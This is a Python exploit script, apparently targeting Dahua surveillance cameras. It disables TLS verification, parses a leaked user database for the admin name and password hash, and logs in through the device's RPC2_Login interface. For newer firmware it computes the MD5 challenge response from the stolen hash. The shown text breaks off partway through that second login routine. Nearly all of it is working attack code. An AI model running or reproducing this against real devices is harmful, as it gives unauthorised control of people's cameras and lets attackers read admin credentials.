import sys
import socket
import argparse
import urllib.request, urllib.error, urllib.parse
import json
import commentjson  # pip install commentjson
import hashlib

class HTTPConnect:
    def __init__(self, host, proto, verbose, creds, raw):
        self.host = host
        self.proto = proto
        self.verbose = verbose
        self.credentials = creds
        self.raw = raw

    def send(self, uri, query_headers, query_data, ID):
        self.uri = uri
        self.query_headers = query_headers
        self.query_data = query_data
        self.ID = ID

        timeout = 5
        socket.setdefaulttimeout(timeout)

        url = '{}://{}{}'.format(self.proto, self.host, self.uri)

        if self.verbose:
            print("[Verbose] Sending:", url)

        if self.proto == 'https':
            if hasattr(socket, '_create_unverified_context'):
                print("[i] Creating SSL Unverified Context")
                socket._create_default_https_context = socket._create_unverified_context

        if self.credentials:
            basic_auth = self.credentials.split(':')
            if self.verbose:
                print("[Verbose] User:", basic_auth[0], "Password:", basic_auth[1])
            try:
                pwd_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
                pwd_mgr.add_password(None, url, basic_auth[0], basic_auth[1])
                auth_handler = urllib.request.HTTPBasicAuthHandler(pwd_mgr)
                opener = urllib.request.build_opener(auth_handler)
                urllib.request.install_opener(opener)
            except Exception as e:
                print("[!] Basic Auth Error:", e)
                sys.exit(1)

        if self.query_data:
            request = urllib.request.Request(url, data=json.dumps(self.query_data).encode(), headers=self.query_headers)
        else:
            request = urllib.request.Request(url, None, headers=self.query_headers)

        try:
            with urllib.request.urlopen(request) as response:
                print("[<] {} OK".format(response.getcode()))

                if self.raw:
                    return response
                else:
                    html = response.read().decode()
                    return html
        except urllib.error.URLError as e:
            print("[!] Error:", e)
            sys.exit(1)


class DahuaBackdoor:
    def __init__(self, rhost, proto, verbose, creds, raw):
        self.rhost = rhost
        self.proto = proto
        self.verbose = verbose
        self.credentials = creds
        self.raw = raw

    def gen2(self, response, headers):
        self.response = response.read().decode()
        self.headers = headers

        html = self.response.splitlines()
        if self.verbose:
            for lines in html:
                print("{}".format(lines))

        for line in html:
            if line[0] == "#" or line[0] == "\n":
                continue
            line = line.split(':')[0:25]
            if line[3] == '1':
                USER_NAME = line[1]
                PWDDB_HASH = line[2]
                print("[i] Choosing Admin Login [{}]: {}, PWD hash: {}".format(line[0], line[1], line[2]))
                break

        print("[>] Requesting our session ID")
        query_args = {"method": "global.login",
                      "params": {"userName": USER_NAME, "password": "", "clientType": "Web3.0"},
                      "id": 10000}

        URI = '/RPC2_Login'
        response = HTTPConnect(self.rhost, self.proto, self.verbose, self.credentials, self.raw).send(URI,
                                                                                                      headers,
                                                                                                      query_args,
                                                                                                      None)

        json_obj = json.loads(response)
        if self.verbose:
            print(json.dumps(json_obj, sort_keys=True, indent=4, separators=(',', ': ')))

        print("[>] Logging in")

        query_args = {"method": "global.login",
                      "session": json_obj['session'],
                      "params": {"userName": USER_NAME, "password": PWDDB_HASH, "clientType": "Web3.0",
                                 "authorityType": "OldDigest"},
                      "id": 10000}

        URI = '/RPC2_Login'
        response = HTTPConnect(self.rhost, self.proto, self.verbose, self.credentials, self.raw).send(URI,
                                                                                                      headers,
                                                                                                      query_args,
                                                                                                      json_obj['session'])
        print(response)

        print("[>] Logging out")
        query_args = {"method": "global.logout",
                      "params": "null",
                      "session": json_obj['session'],
                      "id": 10001}

        URI = '/RPC2'
        response = HTTPConnect(self.rhost, self.proto, self.verbose, self.credentials, self.raw).send(URI,
                                                                                                      headers,
                                                                                                      query_args,
                                                                                                      None)
        return response

    def gen3(self, response, headers):
        self.response = response.read().decode()
        self.headers = headers

        json_string = ""
        start = False
        for x in self.response:
            if x[0] == '{' or start == True:
                start = True
                json_string = json_string + x
        json_obj = json.loads(json_string)

        if self.verbose:
            print(json.dumps(json_obj, sort_keys=True, indent=4, separators=(',', ': ')))

        for who in json_obj[list(json_obj.keys())[0]]:
            if who['Group'] == 'admin':
                USER_NAME = who['Name']
                PWDDB_HASH = who['Password']
                print("[i] Choosing Admin Login: {}".format(who['Name']))
                break

        print("[>] Requesting our session ID")
        query_args = {"method": "global.login",
                      "params": {"userName": USER_NAME, "password": "", "clientType": "Web3.0"},
                      "id": 10000}

        URI = '/RPC2_Login'
        response = HTTPConnect(self.rhost, self.proto, self.verbose, self.credentials, self.raw).send(URI,
                                                                                                      headers,
                                                                                                      query_args,
                                                                                                      None)

        json_obj = json.loads(response)
        if self.verbose:
            print(json.dumps(json_obj, sort_keys=True, indent=4, separators=(',', ': ')))

        RANDOM = json_obj['params']['random']
        PASS = '' + USER_NAME + ':' + RANDOM + ':' + PWDDB_HASH + ''
        RANDOM_HASH = hashlib.md5(PASS.encode()).hexdigest().upper()

        print("[i] Downloaded MD5 hash:", PWDDB_HASH)
        print("[i] Random value to encrypt with:", RANDOM)
        print("[i] Built password:", PASS)
        print("[i] MD5 generated password:", RANDOM_HASH)

        print("[>] Logging in")

        query_args = {"method": "global.login",
                      "session": json_obj['session'],
                      "params": {"userName": USER_NAME, "password": RANDOM_HASH, "clientType": "Web3.0",
                                 "authorityType
